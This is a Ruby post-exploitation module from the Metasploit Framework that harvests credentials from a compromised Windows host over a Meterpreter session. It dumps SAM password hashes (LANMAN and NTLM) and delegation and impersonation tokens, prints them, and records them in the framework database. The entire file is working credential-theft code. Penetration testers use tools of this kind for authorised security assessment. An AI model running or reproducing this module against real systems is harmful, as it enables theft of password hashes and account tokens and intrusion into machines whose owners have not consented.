##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/auxiliary/report'


class Metasploit3 < Msf::Post

  include Msf::Post::Common
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Gather Credential Collector',
        'Description'   => %q{ This module harvests credentials found on the host and stores them in the database.},
        'License'       => MSF_LICENSE,
        'Author'        => [ 'tebo[at]attackresearch.com'],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter']
      ))

  end

  # Run Method for when run command is issued
  def run
    print_status("Running module against #{sysinfo['Computer']}")
    # Collect even without a database to store them.
    if session.framework.db.active
      db_ok = true
    else
      db_ok = false
    end

    # Make sure we're rockin Priv and Incognito
    session.core.use("priv") if not session.priv
    session.core.use("incognito") if not session.incognito

    # It wasn't me mom! Stinko did it!
    hashes = client.priv.sam_hashes

    # Target infos for the db record
    addr = client.sock.peerhost
    # client.framework.db.report_host(:host => addr, :state => Msf::HostState::Alive)

    # Record hashes to the running db instance
    print_good "Collecting hashes..."

    hashes.each do |hash|
      data = {}
      data[:host]  = addr
      data[:port]  = 445
      data[:sname] = 'smb'
      data[:user]  = hash.user_name
      data[:pass]  = hash.lanman + ":" + hash.ntlm
      data[:type]  = "smb_hash"
      if not session.db_record.nil?
        data[:source_id] = session.db_record.id
      end
      data[:source_type] = "exploit",
      data[:active] = true

      print_line "    Extracted: #{data[:user]}:#{data[:pass]}"
      report_auth_info(data) if db_ok
    end

    # Record user tokens
    tokens = session.incognito.incognito_list_tokens(0)
    raise Rex::Script::Completed if not tokens

    # Meh, tokens come to us as a formatted string
    print_good "Collecting tokens..."
    (tokens["delegation"] + tokens["impersonation"]).split("\n").each do |token|
      data = {}
      data[:host]      = addr
      data[:type]      = 'smb_token'
      data[:data]      = token
      data[:update]    = :unique_data

      print_line "    #{data[:data]}"
      report_note(data) if db_ok
    end
  end
end
